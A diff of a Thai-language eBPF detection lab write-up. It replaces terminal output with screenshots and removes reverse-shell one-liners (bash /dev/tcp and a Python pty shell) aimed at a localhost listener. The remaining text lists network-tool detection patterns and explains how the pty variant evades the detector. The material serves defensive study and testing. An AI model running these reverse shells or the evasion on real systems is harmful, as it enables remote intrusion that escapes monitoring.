@@ -278,104 +278,49 @@ pgrep -af "listener.py|threat-guard" || echo "clean"   # หลังจบต�
 
 ## 4. ผลลัพธ์จากการทดลองจริง (Actual Lab Execution Output)
 
-> **Environment**: Ubuntu 26.04 LTS (`Linux 7.0.0-38-generic x86_64`), clang 21, Go 1.26, cilium/ebpf v0.16.0 (บันทึกเมื่อ 2026-10-28)
-> ตัด ANSI color code ออกเพื่อให้อ่านง่าย ระหว่างบันทึกมีเครื่องมืออื่นบนเครื่อง (agent ที่รัน `bash`, `gmake` ของแล็บอื่น) จึงมี `INFO-SHELL` พื้นหลังปนอยู่ ตอนบันทึกไฟล์ `x` อยู่ในไดเรกทอรี scratch ชั่วคราว
+> **Environment**: Ubuntu 26.04 LTS (`Linux 7.0.0-43-generic x86_64`), clang 21, Go 1.26, cilium/ebpf v0.16.0 (บันทึกเมื่อ 2026-11-21)
+> คำสั่งในหัวข้อ 4.1 รันผ่านตัวบันทึกหน้าจอ (`script`) จึงเห็น PARENT เป็น `script` ในหัวข้อ 4.2 และได้ตัด `INFO-SHELL` พื้นหลังจากโปรเซสอื่นบนเครื่องออกจากภาพ (ระบุจำนวนบรรทัดไว้ในภาพ)
 
 <!-- screenshots:begin -->
 
 ### 📸 ภาพหน้าจอจากการรันจริง (Real Terminal Screenshots)
 
-> รันจริงบน `Linux 7.0.0-43-generic` (Ubuntu 26.04) เมื่อ 2026-11-21 ด้วยสคริปต์ [`scripts/screenshots/week15.sh`](../../scripts/screenshots/week15.sh) ทุกบรรทัดในภาพมาจากคำสั่งจริง (render เป็นภาพด้วย `scripts/screenshots/render.py`) ค่าอย่าง PID, เวลา, latency จึงอาจต่างจากข้อความในหัวข้อย่อยด้านล่างเล็กน้อย
+> รันจริงบน `Linux 7.0.0-43-generic` (Ubuntu 26.04) เมื่อ 2026-11-21 ด้วยสคริปต์ [`scripts/screenshots/week15.sh`](../../scripts/screenshots/week15.sh) ทุกบรรทัดในภาพมาจากคำสั่งจริง (render เป็นภาพด้วย `scripts/screenshots/render.py`) ค่าอย่าง PID, เวลา และ latency จะเปลี่ยนทุกครั้งที่รัน
 
-![Terminal 3 — จำลองเหตุการณ์ (a)-(d) + Terminal 1 listener](screenshots/week15-1-attacks.png)
-
-*ภาพที่ 1: Terminal 3 — จำลองเหตุการณ์ (a)-(d) + Terminal 1 listener*
-
-![Terminal 2 — sudo ./bin/threat-guard -all](screenshots/week15-2-guard.png)
-
-*ภาพที่ 2: Terminal 2 — sudo ./bin/threat-guard -all*
-
-![Daemon-spawned shell (CRITICAL-RCE)](screenshots/week15-3-rce.png)
-
-*ภาพที่ 3: Daemon-spawned shell (CRITICAL-RCE)*
+ภาพหน้าจออยู่ในหัวข้อย่อยที่ตรงกันด้านล่าง แทน output แบบข้อความเดิม
 
 ![Terminal 3 — ตรวจ map และสภาพแวดล้อม](screenshots/week15-4-cleanup-check.png)
 
-*ภาพที่ 4: Terminal 3 — ตรวจ map และสภาพแวดล้อม*
+*ภาพที่ 1: Terminal 3 — ตรวจ map และสภาพแวดล้อม*
 
 <!-- screenshots:end -->
 
 ### 4.1 Terminal 3 และ listener
-```text
-$ bash -c "echo benign"
-benign
-$ bash -c 'exec 3<>/dev/tcp/127.0.0.1/4444; exec sh <&3 >&3 2>&3'
-$ cp /bin/sh ./x && bash -c 'exec 3<>/dev/tcp/127.0.0.1/4444; exec ./x <&3 >&3 2>&3'
-$ python3 -c 'import socket,os,pty; s=socket.create_connection(("127.0.0.1",4444)); [os.dup2(s.fileno(),f) for f in (0,1,2)]; pty.spawn("/bin/sh")'
-pty rc=0
-[listener] conn 1 from 127.0.0.1:39622 -> 'shell-uid=1000 comm=sh'
-[listener] conn 2 from 127.0.0.1:39630 -> 'shell-uid=1000 comm=x'
-[listener] conn 3 from 127.0.0.1:39640 -> 'echo shell-uid=$(id -u) comm=$(cat /proc/$$/comm); exit\r\n$ shell-uid=1000 comm=sh'
-```
+
+![Terminal 3 — จำลองเหตุการณ์ (a)-(d) + Terminal 1 listener](screenshots/week15-1-attacks.png)
+
+*ภาพ: Terminal 3 — จำลองเหตุการณ์ (a)-(d) + Terminal 1 listener*
+
 ทั้ง 3 กรณีได้ shell จริง (listener เห็น uid และ comm ของ shell) กรณี pty มี echo ของคำสั่งและ prompt `$` กลับมาด้วย ซึ่งเป็นลักษณะของ terminal จริง
 
 ### 4.2 Threat Guard (`sudo ./bin/threat-guard -all`)
-```text
-======================================================================
- eBPF Reverse Shell & Interactive Threat Detector (CO-RE + RingBuffer)
-======================================================================
-2026/10/28 22:05:24 [CONFIG] shells   : sh,bash,dash,zsh,ksh,mksh,fish,csh,tcsh
-2026/10/28 22:05:24 [CONFIG] nettools : nc,ncat,netcat,nc.openbsd,nc.traditional,socat,telnet
-2026/10/28 22:05:24 [CONFIG] daemons  : nginx,apache2,httpd,php-fpm,node,java,redis-server,mysqld,postgres
-2026/10/28 22:05:24 [INFO] Hooked tracepoint 'sched/sched_process_exec'.
-2026/10/28 22:05:24 [INFO] Watching for shells with socket stdio and daemon-spawned shells...
 
-TIME      SEVERITY           PID      PPID     STDIO PROCESS    PARENT       EXEC FILENAME
-----------------------------------------------------------------------------------------------
-22:05:25  INFO-SHELL         4088174  1896066  ---   bash       2.1.312      /bin/bash
-22:05:25  INFO-SHELL         4088176  4088175  ---   bash       timeout      /usr/bin/bash
-22:05:26  INFO-SHELL         4088267  4087856  ---   bash       bash         /usr/bin/bash
-22:05:26  INFO-SHELL         4088268  4087856  ---   bash       bash         /usr/bin/bash
-22:05:26  CRITICAL-REVSHELL  4088268  4087856  012   sh         bash         /usr/bin/sh
-22:05:26  HIGH-SOCKET-STDIO  4088269  4088268  0-2   id         sh           /usr/bin/id
-22:05:26  HIGH-SOCKET-STDIO  4088270  4088268  0-2   cat        sh           /usr/bin/cat
-22:05:26  INFO-SHELL         4088368  4087856  ---   bash       bash         /usr/bin/bash
-22:05:26  HIGH-SOCKET-STDIO  4088368  4087856  012   x          bash         /tmp/claude-1000/-mnt-sda-ebpf/de1b96f4-c4a2-426e-af44-a6e9641250a9/scratchpad/x
-22:05:26  HIGH-SOCKET-STDIO  4088373  4088368  0-2   id         x            /usr/bin/id
-22:05:26  HIGH-SOCKET-STDIO  4088374  4088368  0-2   cat        x            /usr/bin/cat
-22:05:27  INFO-SHELL         4088470  4088469  ---   sh         python3      /bin/sh
-22:05:27  INFO-SHELL         4088532  4086977  ---   sh         gmake        /bin/sh
-22:05:27  INFO-SHELL         4088554  4086971  ---   sh         gmake        /bin/sh
-22:05:27  INFO-SHELL         4088557  4088556  ---   sh         gmake        /bin/sh
-22:05:27  INFO-SHELL         4088560  4088559  ---   sh         gmake        /bin/sh
-22:05:28  INFO-SHELL         4088836  3760745  ---   bash       claude       /bin/bash
-22:05:28  INFO-SHELL         4088862  3760745  ---   bash       claude       /bin/bash
-22:05:31  INFO-SHELL         4089351  3760745  ---   bash       claude       /bin/bash
-22:05:32  INFO-SHELL         4089699  3760745  ---   bash       claude       /bin/bash
+![Terminal 2 — sudo ./bin/threat-guard -all](screenshots/week15-2-guard.png)
 
-[INFO] Stopping Threat Guard...
-[SUCCESS] Threat Guard cleanly shutdown.
-```
+*ภาพ: Terminal 2 — sudo ./bin/threat-guard -all*
 
 ### 4.3 Daemon-spawned shell (`-daemons nginx,apache2,httpd,php-fpm,node,python3`)
-```text
-$ python3 -c 'import os; os.system("id -un")'   # จำลอง web app ที่ถูก command injection
-ce
-...
-TIME      SEVERITY           PID      PPID     STDIO PROCESS    PARENT       EXEC FILENAME
-----------------------------------------------------------------------------------------------
-22:05:47  CRITICAL-RCE       4093171  4093168  ---   sh         python3      /bin/sh
 
-[INFO] Stopping Threat Guard...
-[SUCCESS] Threat Guard cleanly shutdown.
-```
+![Daemon-spawned shell (CRITICAL-RCE)](screenshots/week15-3-rce.png)
+
+*ภาพ: Daemon-spawned shell (CRITICAL-RCE)*
 
 **วิเคราะห์ผล:**
-- **(b) reverse shell คลาสสิก:** PID 4088268 เริ่มจาก `bash` (INFO) แล้ว `exec sh` ด้วย fd 0/1/2 เป็น socket (`STDIO = 012`) จึงเป็น `CRITICAL-REVSHELL` คำสั่ง `id`, `cat` ที่ผู้โจมตีสั่งผ่าน shell ก็ถูกรายงานด้วย (`0-2`: stdout เป็น pipe เพราะอยู่ใน `$(...)`) กลายเป็น **บันทึกคำสั่งของผู้โจมตี** โดยอัตโนมัติ
+- **(b) reverse shell คลาสสิก:** PID 1224728 เริ่มจาก `bash` (INFO) แล้ว `exec sh` ด้วย fd 0/1/2 เป็น socket (`STDIO = 012`) จึงเป็น `CRITICAL-REVSHELL` คำสั่ง `id`, `cat` ที่ผู้โจมตีสั่งผ่าน shell ก็ถูกรายงานด้วย (`0-2`: stdout เป็น pipe เพราะอยู่ใน `$(...)`) กลายเป็น **บันทึกคำสั่งของผู้โจมตี** โดยอัตโนมัติ
 - **(c) shell เปลี่ยนชื่อ:** `comm = x` ไม่ตรงรายชื่อ shell แต่ยังถูกจับเป็น `HIGH-SOCKET-STDIO` และเห็น path เต็มของไฟล์ ตัวตรวจจับเวอร์ชันเดิม (prefix ของ comm) **ไม่แจ้งเตือนเลย** ในกรณีนี้
-- **(d) pty reverse shell:** `sh` (PID 4088470, parent `python3`) มี stdio เป็น pty ไม่ใช่ socket จึงเห็นเป็นเพียง `INFO-SHELL` ทั้งที่ listener ได้ shell จริง นี่คือ **การหลบหลีกที่สำเร็จ** (ดูข้อ 5)
+- **(d) pty reverse shell:** `sh` (PID 1224746, parent `python3`) มี stdio เป็น pty ไม่ใช่ socket จึงเห็นเป็นเพียง `INFO-SHELL` ทั้งที่ listener ได้ shell จริง นี่คือ **การหลบหลีกที่สำเร็จ** (ดูข้อ 5)
 - **CRITICAL-RCE:** เมื่อ `python3` อยู่ในรายชื่อ daemon, `os.system()` ซึ่งเรียก `/bin/sh -c` ทำให้เกิด alert ทันที
-- `bash` จากเครื่องมือพัฒนา (parent `claude`, `2.1.312`) แสดง `STDIO = ---` เพราะ stdio เป็น unix socket ซึ่งถูกกรองออกตามข้อ 1.4
+- `INFO-SHELL` พื้นหลังจากโปรเซสอื่นบนเครื่อง (ตัดออกจากภาพ) แสดง `STDIO = ---` แม้บางตัวจะมี stdio เป็น unix socket (เช่น shell ที่เครื่องมือพัฒนาเปิด) เพราะ unix socket ถูกกรองออกตามข้อ 1.4
 
 ---
 
